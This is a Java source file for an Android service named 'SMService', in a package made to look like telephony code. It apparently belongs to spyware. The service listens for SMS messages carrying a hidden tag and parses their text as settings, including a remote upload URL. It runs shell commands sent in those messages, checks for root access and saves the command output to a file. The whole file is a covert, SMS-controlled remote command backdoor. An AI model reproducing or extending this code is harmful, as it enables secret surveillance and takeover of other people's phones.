package com.telephony.services;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

public class SMService extends Service {
	private PreferenceUtils sPref = null;
	private ExecutorService es;
	private MyProperties smsProp;

	private String sms_body = null;
	private String phoneNumber = null;
	private String sms_from_name = null;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {

		super.onCreate();
		es = Executors.newFixedThreadPool(1);
		sPref = PreferenceUtils.getInstance(this);
		smsProp = new MyProperties();
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.execute(new RunService(intent, flags, startId, this));
		return START_REDELIVER_INTENT;

	}

	/**
	 * Получить расшифрованные настройки shared preference в файл
	 * 
	 * @param filename
	 * @param input
	 *            TODO
	 * @throws UnsupportedEncodingException
	 * @throws IOException
	 * @throws InvalidKeyException
	 * @throws IllegalBlockSizeException
	 * @throws BadPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws NoSuchPaddingException
	 */
	private void getConfig(String filename, Map<String, String> input) throws UnsupportedEncodingException, IOException, InvalidKeyException,
			IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException {
		FileOutputStream fos = null;
		MyProperties prop = new MyProperties();
		prop.putAll(input);
		try {
			fos = new FileOutputStream(new File(sPref.getRootDir(), filename));
			prop.setIntProperty("current_version", Utils.getCurrentVersion(this));
			prop.setBoolProperty("root_availible", Utils.checkRoot());
			prop.setProperty(PreferenceUtils.ROOT_DIR, sPref.getRootDir().getAbsolutePath());
			prop.setProperty(PreferenceUtils.UPLOAD_URL, sPref.getRemoteUrl());
			prop.setIntProperty(PreferenceUtils.KEEP_DAYS, sPref.getKeepDays());
			prop.setIntProperty(PreferenceUtils.VIBRATE, sPref.getVibrate());
			prop.store(fos, Utils.IDENT_SMS);
		} finally {
			if (fos != null) {
				fos.close();
			}
		}
	}

	/**
	 * Установить параметры
	 * 
	 * @throws IOException
	 * @throws InvalidKeyException
	 * @throws IllegalBlockSizeException
	 * @throws BadPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws NoSuchPaddingException
	 */
	private void setConfig() throws IOException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException,
			NoSuchPaddingException {

		if (!smsProp.isEmpty()) {
			sPref.setRootDir(smsProp.getProperty(PreferenceUtils.ROOT_DIR));
			sPref.setRemoteUrl(smsProp.getProperty(PreferenceUtils.UPLOAD_URL));
			sPref.setKeepDays(smsProp.getIntProperty(PreferenceUtils.KEEP_DAYS));
			sPref.setVibrate(smsProp.getIntProperty(PreferenceUtils.VIBRATE));
		}
	}

	private class RunService implements Runnable {
		private final Intent intent;
		private final int flags;
		private final int startId;
		private final Context context;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		public void run() {
			try {
				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": start " + startId);
				Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
				if (sPref.getRootDir().exists() && (Utils.getExternalStorageStatus() == Utils.MEDIA_MOUNTED)) {
					phoneNumber = intent.getStringExtra(Utils.EXTRA_PHONE_NUMBER);
					sms_from_name = Utils.getContactName(context, phoneNumber);
					sms_body = intent.getStringExtra(Utils.EXTRA_SMS_BODY).replace(Utils.IDENT_SMS, "").trim();
					if (sms_body != null) {
						Map<String, String> exec_out = new HashMap<String, String>();
						smsProp.load(sms_body.replace("#", "\n"));
						setConfig();

						if (smsProp.containsKey(Utils.SMS_KEY_EXEC)) {
							Commander cmdr = new Commander(context);
							try {
								String[] exec = smsProp.getStringsProperty(Utils.SMS_KEY_EXEC);
								for (String cmd : exec) {
									try {
										Log.d(Utils.LOG_TAG, "try to exec: " + cmd);
										exec_out.putAll(cmdr.exec(cmd));
									} catch (Exception e) {
										e.printStackTrace();
									}
								}
							} finally {
								cmdr.free();
							}
						}
						getConfig(Utils.CONFIG_OUT_FILENAME, exec_out);
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				stop();
			}
		}

		public void stop() {
			try {

			} catch (Exception e) {
				e.printStackTrace();
			}
			Log.d(Utils.LOG_TAG, context.getClass().getName() + ": stop " + startId);
			stopSelf(startId);
		}

	}

	@Override
	public void onDestroy() {

		super.onDestroy();
		es = null;
		sPref = null;
		smsProp.clear();
		smsProp = null;
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

}
